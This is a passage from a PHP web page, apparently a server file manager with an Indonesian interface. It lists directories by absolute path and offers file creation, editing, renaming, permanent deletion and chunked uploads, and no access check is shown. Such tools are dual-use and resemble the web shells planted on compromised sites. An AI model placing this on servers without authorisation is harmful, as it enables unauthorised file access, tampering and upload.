          <textarea name="file_content" placeholder="Isi file..." style="background:transparent;border:1px solid var(--line);border-radius:10px;color:var(--text);padding:8px;min-height:100px;"></textarea>
          <div style="display:flex; gap:8px; align-items:center;">
            <button type="submit" style="background:transparent;border:1px solid var(--line);border-radius:10px;padding:8px 16px;color:var(--text);cursor:pointer;">Buat File</button>
          </div>
        </form>
      </div>

      <!-- Tabel Listing -->
      <div class="table-wrap">
        <table class="table">
          <thead>
            <tr>
              <th>Nama</th>
              <th>Izin</th>
              <th class="hide-sm">Ukuran</th>
              <th>Diubah</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody>
          <?php if(!$items): ?>
            <tr><td colspan="5" style="color:var(--muted)">Kosong / tidak ada izin.</td></tr>
          <?php else: foreach($items as $it): ?>
            <tr>
              <td class="namecell">
                <?php if($it['is_dir']): ?>
                  <svg class="icon" style="vertical-align:-3px;margin-right:6px"><use href="#ico-folder"/></svg>
                  <a href="?path=<?=rawurlencode($it['abs'])?>"><?=h($it['name'])?></a>
                <?php else: ?>
                  <svg class="icon" style="vertical-align:-3px;margin-right:6px"><use href="#ico-file"/></svg>
                  <?=h($it['name'])?>
                <?php endif; ?>
              </td>
              <td class="permcell" title="<?=h($it['perm'])?>"><?=h($it['perm'])?></td>
              <td class="hide-sm"><?= $it['is_dir']?'-':bytes_fmt($it['size']) ?></td>
              <td><?= $it['mtime']?date('Y-m-d H:i:s',$it['mtime']):'-' ?></td>
              <td>
                <div class="rowacts">
                  <?php if(!$it['is_dir'] && is_textual_file($it['abs'])): ?>
                    <a class="iconbtn" title="Edit" href="?path=<?=rawurlencode($CURRENT)?>&edit=<?=rawurlencode($it['abs'])?>"><svg class="icon"><use href="#ico-edit"/></svg></a>
                  <?php endif; ?>
                  <form method="post" class="rowacts" onsubmit="return confirm('Rename item ini?')">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="old_path" value="<?=h($it['abs'])?>">
                    <input type="text" name="new_name" value="<?=h($it['name'])?>" placeholder="Nama baru">
                    <button class="iconbtn" title="Rename" type="submit"><svg class="icon"><use href="#ico-rename"/></svg></button>
                  </form>
                  <form method="post" class="rowacts" onsubmit="return confirm('Hapus permanen?')">
                    <input type="hidden" name="action" value="delete">
                    <input type="hidden" name="target_path" value="<?=h($it['abs'])?>">
                    <button class="iconbtn danger" title="Hapus" type="submit"><svg class="icon"><use href="#ico-delete"/></svg></button>
                  </form>
                </div>
              </td>
            </tr>
          <?php endforeach; endif; ?>
          </tbody>
        </table>
      </div>

    <?php endif; ?>
  </div>
</div>

<script>
(function(){
  const fileInput = document.getElementById('fileInput');
  const btn = document.getElementById('btnChunkUpload');
  const statusEl = document.getElementById('chunkStatus');
  if(!btn || !fileInput) return;

  const CHUNK_SIZE = <?= (int)CHUNK_SIZE_BYTES ?>;

  function uuid(){
    return 'xxxx-4xxx-yxxx-xxxx'.replace(/[xy]/g, c => {
      const r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
      return v.toString(16);
    }) + '-' + Date.now();
  }

  async function uploadFileChunked(f){
    const totalChunks = Math.ceil(f.size / CHUNK_SIZE) || 1;
    const uploadId = uuid();
    for(let i=0;i<totalChunks;i++){
      const start = i*CHUNK_SIZE, end = Math.min(start+CHUNK_SIZE, f.size);
      const blob = f.slice(start, end);
      const fd = new FormData();
      fd.append('upload_id', uploadId);
      fd.append('file_name', f.name);
      fd.append('chunk_index', i.toString());
      fd.append('total_chunks', totalChunks.toString());
      fd.append('chunk', new File([blob], 'chunk.bin', {type:'application/octet-stream'}));
      const u = new URL(window.location.href);
      u.searchParams.set('path', '<?= rawurlencode($CURRENT) ?>');
      u.searchParams.set('chunk', '1');
      let res;
      try{
        res = await fetch(u.toString(), { method: 'POST', body: fd, credentials: 'same-origin' });
      }catch(e){
        throw new Error('Jaringan gagal pada chunk '+(i+1)+'/'+totalChunks);
      }
      if(!res.ok){ throw new Error('Gagal upload chunk '+(i+1)+'/'+totalChunks+' (HTTP '+res.status+')'); }
      statusEl.textContent = 'Mengunggah "'+f.name+'" '+(i+1)+'/'+totalChunks+'...';
    }
  }

  btn.addEventListener('click', async () => {
    const files = fileInput.files;
    if(!files || !files.length){ alert('Pilih file dulu.'); return; }
    btn.disabled = true; statusEl.textContent = 'Mulai unggah...';
    let ok=0, fail=0, msgs=[];
    for(const f of files){
      try{
        await uploadFileChunked(f); ok++;
      }catch(err){
        fail++; msgs.push(f.name+': '+err.message);
      }
    }
    statusEl.textContent = 'Selesai. Berhasil: '+ok+', Gagal: '+fail + (msgs.length?' ('+msgs.join('; ')+')':'');
    setTimeout(()=>{ window.location = '?path=<?= rawurlencode($CURRENT) ?>'; }, 600);
  });
})();
</script>
</body>
</html>
